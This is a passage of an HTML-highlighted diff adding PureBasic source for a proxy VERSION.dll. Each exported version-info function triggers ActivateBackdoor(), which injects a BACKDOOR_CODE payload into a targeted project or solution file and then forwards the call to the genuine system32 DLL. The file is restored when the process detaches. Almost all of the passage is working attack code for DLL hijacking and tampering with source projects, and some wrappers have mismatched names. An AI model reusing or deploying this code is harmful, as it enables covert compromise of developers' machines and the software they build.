+  <span class="err">;</span> <span class="n">write</span> <span class="n">backdoor</span>
+  <span class="n">writeSize</span> <span class="o">=</span> <span class="n">Len</span><span class="p">(#</span><span class="n">BACKDOOR_CODE</span><span class="p">)</span>
+  
+  <span class="k">If</span> <span class="n">WriteString</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">#</span><span class="n">BACKDOOR_CODE</span><span class="p">,</span> <span class="p">#</span><span class="n">PB_UTF8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="err">;</span> <span class="n">we</span> <span class="n">should</span> <span class="n">add</span> <span class="n">a</span> <span class="n">restore</span> <span class="n">of</span> <span class="n">the</span> <span class="n">original</span> <span class="n">file</span> <span class="n">here</span>
+    <span class="err">;</span> <span class="p">.</span><span class="err">..</span> <span class="n">depending</span> <span class="n">on</span> <span class="n">the</span> <span class="n">write</span> <span class="n">error</span> <span class="p">.</span><span class="err">..</span>
+    <span class="n">Goto</span> <span class="n">InsertBackdoorError</span>
+  <span class="k">EndIf</span>
+  
+  <span class="err">;</span> <span class="n">write</span> <span class="n">rest</span> <span class="n">of</span> <span class="n">file</span>
+  <span class="n">writeSize</span> <span class="o">=</span> <span class="n">origContentSize</span><span class="o">-</span><span class="n">sizeLeft</span>
+  <span class="k">If</span> <span class="n">WriteString</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">Right</span><span class="p">(</span><span class="n">origContent</span><span class="p">,</span> <span class="n">writeSize</span><span class="p">),</span> <span class="p">#</span><span class="n">PB_UTF8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="err">;</span> <span class="n">we</span> <span class="n">should</span> <span class="n">add</span> <span class="n">a</span> <span class="n">restore</span> <span class="n">of</span> <span class="n">the</span> <span class="n">original</span> <span class="n">file</span> <span class="n">here</span>
+    <span class="err">;</span> <span class="p">.</span><span class="err">..</span> <span class="n">depending</span> <span class="n">on</span> <span class="n">the</span> <span class="n">write</span> <span class="n">error</span> <span class="p">.</span><span class="err">..</span>
+    <span class="n">Goto</span> <span class="n">InsertBackdoorError</span>
+  <span class="k">EndIf</span>
+  
+  <span class="n">res</span> <span class="o">=</span> <span class="p">#</span><span class="k">True</span>
+<span class="n">InsertBackdoorCleanup</span><span class="p">:</span>
+  <span class="n">CloseFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">)</span>
+  <span class="n">ProcedureReturn</span> <span class="n">res</span>
+<span class="n">InsertBackdoorError</span><span class="p">:</span>  
+  <span class="k">If</span> <span class="n">Len</span><span class="p">(</span><span class="n">origContent</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
+    <span class="n">origContent</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">origContentSize</span><span class="o">=</span> <span class="mi">0</span>
+  <span class="k">EndIf</span>
+  <span class="n">Goto</span> <span class="n">InsertBackdoorCleanup</span>
+<span class="n">EndProcedure</span>
+
+<span class="n">Procedure</span> <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">LockMutex</span><span class="p">(</span><span class="n">mux</span><span class="p">)</span>
+  <span class="err">;</span> <span class="n">check</span> <span class="n">if</span> <span class="n">the</span> <span class="n">backdoor</span> <span class="n">is</span> <span class="n">already</span> <span class="n">alive</span>
+  <span class="k">If</span> <span class="p">#</span><span class="n">BACKDOOR_ALIVE</span> <span class="o">=</span> <span class="n">active</span>
+    <span class="n">Goto</span> <span class="n">ActivateBackdoorCleanup</span>
+  <span class="k">EndIf</span>
+  <span class="err">;</span> <span class="n">check</span> <span class="n">if</span> <span class="n">we</span> <span class="n">have</span> <span class="n">the</span> <span class="n">right</span> <span class="n">solution</span>
+  <span class="n">Define</span> <span class="n">targetFilepath</span><span class="p">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">GetTargetFilePath</span><span class="p">()</span>
+  <span class="k">If</span> <span class="n">Len</span><span class="p">(</span><span class="n">targetFilepath</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span>
+    <span class="n">Goto</span> <span class="n">ActivateBackdoorCleanup</span>
+  <span class="k">EndIf</span>
+  
+  <span class="n">MessageRequester</span><span class="p">(</span><span class="s">"ActivateBackdoor"</span><span class="p">,</span> <span class="s">"Hello World from Solution: "</span> <span class="o">+</span> <span class="p">#</span><span class="n">CRLF</span><span class="err">$</span> <span class="o">+</span> <span class="n">ProgramParameter</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+  
+  <span class="err">;</span> <span class="n">init</span> <span class="n">backdoor</span>
+  <span class="k">If</span> <span class="n">InsertBackdoor</span><span class="p">(</span><span class="n">targetFilepath</span><span class="p">)</span>
+    <span class="n">active</span> <span class="o">=</span> <span class="p">#</span><span class="n">BACKDOOR_ALIVE</span>
+    <span class="n">MessageRequester</span><span class="p">(</span><span class="s">"ActivateBackdoor"</span><span class="p">,</span> <span class="s">"... backdoor insered ..."</span><span class="p">)</span>
+  <span class="k">Else</span>
+    <span class="n">MessageRequester</span><span class="p">(</span><span class="s">"ActivateBackdoor"</span><span class="p">,</span> <span class="s">"... backdooring failed ..."</span><span class="p">)</span>
+  <span class="k">EndIf</span>
+  
+<span class="n">ActivateBackdoorCleanup</span><span class="p">:</span>
+  <span class="n">UnlockMutex</span><span class="p">(</span><span class="n">mux</span><span class="p">)</span>
+  <span class="n">ProcedureReturn</span>
+<span class="n">EndProcedure</span>
+
+<span class="n">Procedure</span> <span class="n">CleanupBackdoor</span><span class="p">()</span>
+  <span class="n">LockMutex</span><span class="p">(</span><span class="n">mux</span><span class="p">)</span>
+  <span class="k">If</span> <span class="p">#</span><span class="n">BACKDOOR_ALIVE</span> <span class="o">=</span> <span class="n">active</span>
+    <span class="n">active</span> <span class="o">=</span> <span class="p">#</span><span class="n">Null</span>
+    <span class="err">;</span> <span class="k">Do</span> <span class="n">cleanup</span> <span class="n">here</span>
+    <span class="k">If</span> <span class="n">origContentSize</span> <span class="o">&lt;&gt;</span> <span class="mi">0</span>
+      <span class="n">Define</span> <span class="n">hFile</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(#</span><span class="n">PB_Any</span><span class="p">,</span> <span class="n">GetTargetFilePath</span><span class="p">(),</span> <span class="p">#</span><span class="n">PB_UTF8</span><span class="p">)</span>
+      <span class="k">If</span> <span class="n">hFile</span>
+        <span class="n">WriteString</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">origContent</span><span class="p">,</span> <span class="p">#</span><span class="n">PB_UTF8</span><span class="p">)</span>
+        <span class="n">CloseFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">)</span>
+      <span class="k">EndIf</span>
+      <span class="n">origContent</span> <span class="o">=</span> <span class="s">""</span>
+      <span class="n">origContentSize</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">EndIf</span>
+  <span class="k">EndIf</span>
+<span class="n">CleanupBackdoorCleanup</span><span class="p">:</span>
+  <span class="n">UnlockMutex</span><span class="p">(</span><span class="n">mux</span><span class="p">)</span>
+  <span class="n">ProcedureReturn</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span> <span class="o">---------------------------------------------------------------------------</span>
+<span class="err">;</span><span class="o">-</span> <span class="n">DllMain</span> <span class="n">Stuff</span>
+
+<span class="n">ProcedureDLL</span> <span class="n">AttachProcess</span><span class="p">(</span><span class="n">Instance</span><span class="p">)</span>
+  <span class="n">mux</span> <span class="o">=</span> <span class="n">CreateMutex</span><span class="p">()</span>
+<span class="n">EndProcedure</span>
+
+<span class="n">ProcedureDLL</span> <span class="n">DetachProcess</span><span class="p">(</span><span class="n">Instance</span><span class="p">)</span>
+  <span class="n">CleanupBackdoor</span><span class="p">()</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span> <span class="o">---------------------------------------------------------------------------</span>
+<span class="err">;</span><span class="o">-</span> <span class="n">orig</span> <span class="n">VERSION</span><span class="p">.</span><span class="n">dll</span> <span class="n">Stuff</span>
+
+<span class="n">Procedure</span><span class="p">.</span><span class="n">i</span> <span class="n">LoadVersionDll</span><span class="p">()</span>
+  <span class="n">Define</span> <span class="n">res</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="p">#</span><span class="n">Null</span>
+  <span class="n">LockMutex</span><span class="p">(</span><span class="n">mux</span><span class="p">)</span>
+  <span class="k">If</span> <span class="p">#</span><span class="n">Null</span> <span class="o">=</span> <span class="n">hVersion</span>
+    <span class="err">;</span> <span class="n">load</span> <span class="n">version</span><span class="p">.</span><span class="n">dll</span>
+    <span class="n">Define</span> <span class="n">dllPath</span><span class="p">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">GetEnvironmentVariable</span><span class="p">(</span><span class="s">"windir"</span><span class="p">)</span> <span class="o">+</span> <span class="s">"\system32\version.dll"</span>
+    <span class="n">hVersion</span> <span class="o">=</span> <span class="n">OpenLibrary</span><span class="p">(#</span><span class="n">PB_Any</span><span class="p">,</span> <span class="n">dllPath</span><span class="p">)</span>
+  <span class="k">EndIf</span>
+  <span class="n">res</span> <span class="o">=</span> <span class="n">hVersion</span>
+<span class="n">CleanupLoadVersionDll</span><span class="p">:</span>
+  <span class="n">UnlockMutex</span><span class="p">(</span><span class="n">mux</span><span class="p">)</span>
+  <span class="n">ProcedureReturn</span> <span class="n">res</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">BOOL</span> <span class="n">GetFileVersionInfoA</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">lptstrFilename</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">dwHandle</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">dwLen</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPVOID</span> <span class="n">lpData</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoA</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoA"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">BOOL</span> <span class="n">GetFileVersionInfoExA</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">dwFlags</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">lpwstrFilename</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">dwHandle</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">dwLen</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPVOID</span> <span class="n">lpData</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoExA</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a5</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoExA"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">BOOL</span> <span class="n">GetFileVersionInfoExW</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">dwFlags</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">lpwstrFilename</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">dwHandle</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">dwLen</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPVOID</span>  <span class="n">lpData</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoSizeExW</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a5</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoSizeExW"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">GetFileVersionInfoSizeA</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span>  <span class="n">lptstrFilename</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPDWORD</span> <span class="n">lpdwHandle</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoSizeA</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoSizeA"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">GetFileVersionInfoSizeExA</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">dwFlags</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span>  <span class="n">lpwstrFilename</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPDWORD</span> <span class="n">lpdwHandle</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoSizeExA</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoSizeExA"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">GetFileVersionInfoSizeExW</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">dwFlags</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">lpwstrFilename</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPDWORD</span> <span class="n">lpdwHandle</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoExW</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoExW"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">GetFileVersionInfoSizeW</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">lptstrFilename</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPDWORD</span> <span class="n">lpdwHandle</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoSizeW</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoExW"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">BOOL</span> <span class="n">GetFileVersionInfoW</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">lptstrFilename</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">dwHandle</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">dwLen</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPVOID</span>  <span class="n">lpData</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoW</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoW"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span> <span class="n">int</span> <span class="n">hMem</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpFileName</span><span class="p">,</span> <span class="n">int</span> <span class="n">v2</span><span class="p">,</span> <span class="n">int</span> <span class="n">v3</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">GetFileVersionInfoByHandle</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">l</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"GetFileVersionInfoByHandle"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">VerFindFileA</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">uFlags</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">szFileName</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">szWinDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">szAppDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPSTR</span>  <span class="n">szCurDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">PUINT</span>  <span class="n">puCurDirLen</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPSTR</span>  <span class="n">szDestDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">PUINT</span>  <span class="n">puDestDirLen</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">VerFindFileA</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a5</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a6</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a7</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a8</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"VerFindFileA"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">a7</span><span class="p">,</span> <span class="n">a8</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">VerFindFileW</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">uFlags</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">szFileName</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">szWinDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">szAppDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPWSTR</span>  <span class="n">szCurDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">PUINT</span>   <span class="n">puCurDirLen</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPWSTR</span>  <span class="n">szDestDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">PUINT</span>   <span class="n">puDestDirLen</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">VerFindFileW</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a5</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a6</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a7</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a8</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"VerFindFileW"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">a7</span><span class="p">,</span> <span class="n">a8</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">VerInstallFileA</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">uFlags</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">szSrcFileName</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">szDestFileName</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">szSrcDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">szDestDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span> <span class="n">szCurDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPSTR</span>  <span class="n">szTmpFile</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">PUINT</span>  <span class="n">puTmpFileLen</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">VerInstallFileA</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a5</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a6</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a7</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a8</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"VerInstallFileA"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">a7</span><span class="p">,</span> <span class="n">a8</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">VerInstallFileW</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>   <span class="n">uFlags</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">szSrcFileName</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">szDestFileName</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">szSrcDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">szDestDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">szCurDir</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPWSTR</span>  <span class="n">szTmpFile</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">PUINT</span>   <span class="n">puTmpFileLen</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
